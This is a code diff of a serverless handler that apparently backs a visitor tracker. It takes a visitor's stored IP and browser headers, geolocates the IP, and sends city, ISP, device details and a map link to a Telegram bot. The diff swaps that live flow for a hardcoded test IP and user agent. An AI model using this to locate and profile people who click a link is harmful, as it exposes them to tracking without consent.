@@ -18,46 +18,53 @@ if (!admin.apps.length) {
 const firestore = admin.firestore();
 
 exports.handler = async (event, context) => {
-    const body = JSON.parse(event.body);
+    // const body = JSON.parse(event.body);
 
-    if (body.callback_query) {
-        const chatId = body.callback_query.message.chat.id;
-        const data = body.callback_query.data;
+    // if (body.callback_query) {
+    //     const chatId = body.callback_query.message.chat.id;
+    //     const data = body.callback_query.data;
 
-        const userAgent = await firestore.collection('visitors').doc(data).get();
+    const data = "116.75.61.131";
+    const chatId = process.env.CHAT_ID;
+    // const userAgent = await firestore.collection('visitors').doc(data).get();
 
 
-        const myHeaders = new Headers();
-        myHeaders.append("content-type", "application/x-www-form-urlencoded; charset=UTF-8");
+    // const myHeaders = new Headers();
+    // myHeaders.append("content-type", "application/x-www-form-urlencoded; charset=UTF-8");
 
-        const raw = `ip=${data}&source=ipgeolocation&ipv=4`;
+    // const raw = `ip=${data}&source=ipgeolocation&ipv=4`;
 
-        const requestOptions = {
-            method: "POST",
-            headers: myHeaders,
-            body: raw,
-            redirect: "follow"
-        };
+    // const requestOptions = {
+    //     method: "POST",
+    //     headers: myHeaders,
+    //     body: raw,
+    //     redirect: "follow"
+    // };
 
-        const res = await fetch("https://www.iplocation.net/get-ipdata", requestOptions)
-        const xml = (await res.json()).res.data;
-        const parser = new UAParser(userAgent.data()['headers']).withClientHints();
+    // const res = await fetch("https://www.iplocation.net/get-ipdata", requestOptions)
+    // const xml = (await res.json()).res.data;
+    const parser = new UAParser({
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-model': 'Galaxy S3 Marketing',
+        'sec-ch-ua-platform': 'Android'
+    });
 
-        let message = "";
-        message += `<b>IP</b>\n${data}\n\n__________________\n\n<b>Browser</b>\n${parser.getBrowser().name}\n\n<b>CPU</b>\n${parser.getCPU().architecture}\n\n<b>Device</b>\n${parser.getDevice().model} ${parser.getDevice().vendor} ${parser.getDevice().type}\n\n<b>OS</b>\n${parser.getOS().name}\n\n__________________\n\n`;
+    let message = "";
+    message += `<b>IP</b>\n${data}\n\n__________________\n\n<b>Browser</b>\n${parser.getBrowser().name}\n\n<b>CPU</b>\n${parser.getCPU().architecture}\n\n<b>Device</b>\n${parser.getDevice().model} ${parser.getDevice().vendor} ${parser.getDevice().type}\n\n<b>OS</b>\n${parser.getOS().name}\n\n__________________\n\n`;
 
-        message += `<b>Continent</b>\n${xml.continent_name}\n\n<b>Country</b>\n${xml.country_name}\n\n<b>State</b>\n${xml.state_prov}\n\n<b>District</b>\n${xml.district}\n\n<b>City</b>\n${xml.city}\n\n<b>ISP</b>\n${xml.isp} - ${xml.connection_type}\n\n<b>Organization</b>\n${xml.organization}\n\n__________________\n\n<a href="https://www.google.com/maps/search/?api=1&query=${xml.latitude},${xml.longitude}">See On Maps</a>`;
+    // message += `<b>Continent</b>\n${xml.continent_name}\n\n<b>Country</b>\n${xml.country_name}\n\n<b>State</b>\n${xml.state_prov}\n\n<b>District</b>\n${xml.district}\n\n<b>City</b>\n${xml.city}\n\n<b>ISP</b>\n${xml.isp} - ${xml.connection_type}\n\n<b>Organization</b>\n${xml.organization}\n\n__________________\n\n<a href="https://www.google.com/maps/search/?api=1&query=${xml.latitude},${xml.longitude}">See On Maps</a>`;
 
-        const r1 = await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: "HTML"
-            })
-        });
-    }
+    const r1 = await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: "HTML"
+        })
+    });
+    // }
 
     return { statusCode: 200, body: "ok" };
 }
